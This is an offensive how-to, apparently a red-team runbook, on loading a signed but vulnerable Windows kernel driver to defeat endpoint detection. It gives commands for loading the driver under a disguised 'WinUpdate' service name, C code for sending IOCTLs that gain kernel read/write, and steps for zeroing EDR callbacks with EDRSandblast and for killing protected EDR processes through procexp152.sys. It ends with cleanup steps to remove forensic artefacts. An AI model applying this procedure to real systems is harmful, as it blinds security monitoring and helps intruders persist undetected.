# BYOVD: loading a vulnerable driver

Loading a signed but vulnerable kernel driver to remove EDR kernel callbacks and
achieve tamper-resistant implant operation.

## Prerequisites

- Administrator privileges on the target (required for driver loading)
- A vulnerable driver not on the Windows Vulnerable Driver Blocklist for the target
  OS version
- Knowledge of the target's kernel version for offset calculations

```powershell
# confirm administrator context
whoami /priv | findstr SeLoadDriverPrivilege
# must show: SeLoadDriverPrivilege    Enabled

# get Windows version for offset lookup
[System.Environment]::OSVersion.Version
(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').CurrentBuildNumber
```

## Select a vulnerable driver

Consult loldrivers.io for drivers matching:

1. Not blocklisted on the target's Windows version
2. Provides arbitrary kernel read/write or process termination via IOCTL
3. Available as a binary (some entries include download links to legitimate sources)

Confirm the hash is not on the blocklist:

```powershell
# check against Microsoft's blocklist (requires WDAC/HVCI enabled)
# or manually check the driver hash against known blocklist databases
$hash = Get-FileHash .\driver.sys -Algorithm SHA256
# compare $hash.Hash against loldrivers.io entries and Microsoft blocklist
```

## Load the driver

```text
# copy driver to a location that looks reasonable
copy driver.sys C:\Windows\System32\drivers\WinUpdate.sys

# create a service (requires admin)
sc create WinUpdate binpath= "C:\Windows\System32\drivers\WinUpdate.sys" type= kernel start= demand
sc start WinUpdate

# alternatively via NtLoadDriver (avoids sc.exe telemetry)
# requires setting the registry key first:
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinUpdate" /v ImagePath /t REG_EXPAND_SZ /d "\??\C:\Windows\System32\drivers\WinUpdate.sys" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinUpdate" /v Type /t REG_DWORD /d 1 /f
# then call NtLoadDriver via P/Invoke or a loader utility
```

## Open a handle and communicate

```c
// open device handle
HANDLE hDevice = CreateFileA(
    "\\\\.\\WinUpdate",      // device name from driver's IOCTL interface
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL, OPEN_EXISTING, 0, NULL
);

// send IOCTL to perform kernel read/write
// IOCTL codes and structure layouts are driver-specific
// consult the vulnerability research for the specific driver
DeviceIoControl(hDevice, IOCTL_CODE, input_buffer, input_size,
                output_buffer, output_size, &bytes_returned, NULL);
```

## Remove EDR kernel callbacks

With a kernel write primitive, locate and zero callback arrays. The target structures:

```c
// PspCreateProcessNotifyRoutine: array of CALLBACK_ENTRY_ITEM pointers
// located by pattern scanning ntoskrnl.exe for the reference in PsSetCreateProcessNotifyRoutine

// enumerate callbacks via kernel read, then zero each EDR entry
// EDR entries are identified by the driver image name (loaded at a known base)

// public tools that automate this for common Windows versions:
// EDRSandblast: https://github.com/wavestone-cdt/EDRSandblast
// (compile and run on target; requires the vulnerable driver)
```

EDRSandblast automates offset lookup (from a bundled table indexed by build number)
and callback removal:

```text
# EDRSandblast with a specific vulnerable driver
EDRSandblast.exe --kernelmode --driver WinUpdate.sys --service WinUpdate
```

## Terminate EDR process directly

For EDR products where callback removal is insufficient, the procexp152.sys driver
from Sysinternals exposes an IOCTL that terminates arbitrary processes, bypassing
Protected Process Light (PPL) restrictions that prevent normal process termination.

```c
// IOCTL to terminate a process via procexp152.sys
// documented: the IOCTL code and input structure are public from Sysinternals research
DWORD pid = GetEDRProcessId();  // find by process name
DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &pid, sizeof(DWORD),
                NULL, 0, &bytes, NULL);
```

## Clean up after the operation

```text
# stop and remove the driver service
sc stop WinUpdate
sc delete WinUpdate

# remove the driver file
del C:\Windows\System32\drivers\WinUpdate.sys

# clean registry entries if NtLoadDriver was used
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinUpdate" /f
```

Note: driver load and unload events (System Event Log 7045, 7036) are written at
load time. Cleaning up the service removes the ongoing artefact but the event log
entry for the load persists unless logs are cleared, which is itself a detectable
action.
